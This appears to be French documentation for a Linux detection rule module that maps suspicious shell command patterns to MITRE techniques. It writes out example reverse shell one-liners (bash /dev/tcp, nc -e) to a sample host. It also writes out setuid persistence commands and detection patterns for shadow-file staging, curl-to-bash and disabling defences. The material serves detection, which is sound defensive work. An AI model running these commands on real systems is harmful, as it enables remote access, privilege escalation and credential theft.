# linux_suspicious.yaml

**Fichier :** `src/detect/modules/linux_suspicious.yaml`  
**Logsource :** Linux / syslog  
**Focus :** Commandes shell Linux/Unix suspectes

!!! info "Champ utilisé"
    Ce fichier cible `CommandLine`, pas `ScriptBlockText` (spécifique à Windows).  
    Il fonctionne donc avec les événements Linux normalisés depuis syslog (auditd, rsyslog, CEF).

## Sélections

| Sélection | Patterns clés | MITRE |
|---|---|---|
| `selection_chmod_suspicious` | `chmod +s`, `chmod 4755`, `chmod 777 /tmp` | T1222.002 |
| `selection_chown_root` | `chown root:`, `chown 0:0` | T1222.002 |
| `selection_cron_suspicious` | `crontab -`, `* * * * * curl`, `/etc/cron.d/` | T1053.003 |
| `selection_pipe_exec` | `curl.*\|.*bash`, `wget.*\|.*sh` | T1059.004 |
| `selection_reverse_shell` | `bash -i >& /dev/tcp`, `nc -e /bin/bash` | T1059.004 |
| `selection_passwd_manipulation` | `/etc/passwd`, `/etc/shadow`, `useradd -o -u 0` | T1098 |
| `selection_disable_defenses` | `setenforce 0`, `ufw disable`, `iptables -F` | T1562.001 |
| `selection_staging` | `tar czf /tmp/`, `base64 /etc/shadow` | T1074 |

## chmod +s — explication

`chmod +s` positionne le bit **setuid** ou **setgid**. Un exécutable avec setuid s'exécute avec les droits de son **propriétaire** (souvent root) plutôt que de l'utilisateur qui le lance.

```bash
chmod +s /bin/bash      # bash devient root pour tout le monde
chmod 4755 /tmp/shell   # équivalent — bit setuid explicite
```

C'est un vecteur de persistance post-exploitation classique.

## Reverse shell patterns

```bash
# Bash TCP redirect
bash -i >& /dev/tcp/192.168.1.50/4444 0>&1

# Netcat
nc -e /bin/bash 192.168.1.50 4444

# Python
python3 -c "import socket,subprocess,os; s=socket.socket(...)..."
```

Ces commandes ouvrent un shell interactif vers une machine distante. Aucun usage légitime en production.

## Intégration avec auditd (v5)

En v4, la détection Linux repose sur les `CommandLine` présents dans les events syslog. En v5, l'intégration directe avec **auditd** (`/var/log/audit/audit.log`) permettra de détecter les syscalls (open, execve, connect) sans dépendre du logging shell.
